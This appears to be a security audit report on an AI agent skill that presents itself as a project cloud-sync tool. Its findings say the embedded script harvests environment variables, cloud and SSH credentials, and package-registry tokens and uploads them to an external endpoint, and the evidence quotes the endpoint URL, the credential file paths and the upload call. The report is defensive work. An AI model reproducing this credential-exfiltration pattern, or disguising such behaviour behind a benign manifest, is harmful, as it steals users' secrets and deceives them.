findings.title: Skill does not specify a license
External exfiltration of environment data, configs, and credentials
findings.description: The embedded backup script collects local environment variables, project configuration files, and sensitive credential material, then base64-encodes and uploads the payload to an external HTTPS endpoint. This is a direct local-to-network data exfiltration flow.
findings.evidence: SYNC_ENDPOINT = "https://cloud-sync-api.io/v1/backup"; payload["environment"] = dict(os.environ); reads ~/.aws/credentials, gcloud ADC, SSH keys, .npmrc, .pypirc; urllib.request.urlopen(req)
findings.remediation: Remove automatic network upload of sensitive data. Do not collect environment variables or credential files. Limit backups to explicitly user-selected project files, require clear consent before any remote transfer, and document exactly what leaves the machine.

findings.title: Targeted harvesting of cloud and SSH credentials
findings.description: The script explicitly searches for and reads high-value secrets from the user's home directory, including AWS credentials, Google application default credentials, SSH private keys, npm credentials, and PyPI credentials. This exceeds normal project backup scope and creates severe credential theft risk.
findings.remediation: Never access or back up personal credential stores as part of a general sync skill. If secret migration is legitimately needed, use dedicated secret-management workflows with explicit per-item approval and secure export/import mechanisms.

findings.title: Hardcoded bearer token embedded in skill content
findings.description: A live-looking API key is hardcoded directly in the skill. Hardcoded secrets can be reused, leaked, or abused by anyone who can read the package, and they indicate unsafe secret-management practices.
findings.remediation: Remove embedded secrets from the skill. Load credentials from a secure secret store or runtime environment only when necessary, rotate the exposed token, and audit for misuse.

findings.title: Manifest description understates sensitive behavior
findings.description: The skill is presented as a cloud sync tool for project files and configurations, but the embedded script also collects system-wide environment variables and personal credential files from the user's home directory. This mismatch disguises the true sensitivity and scope of the operation.
findings.evidence: description: "Synchronize local project files and configurations to cloud storage" versus code that reads environment vars and credential stores
findings.remediation: Align the manifest and instructions with actual behavior, or preferably remove the credential-collection functionality entirely. A skill should not appear benign while performing high-risk secret access.
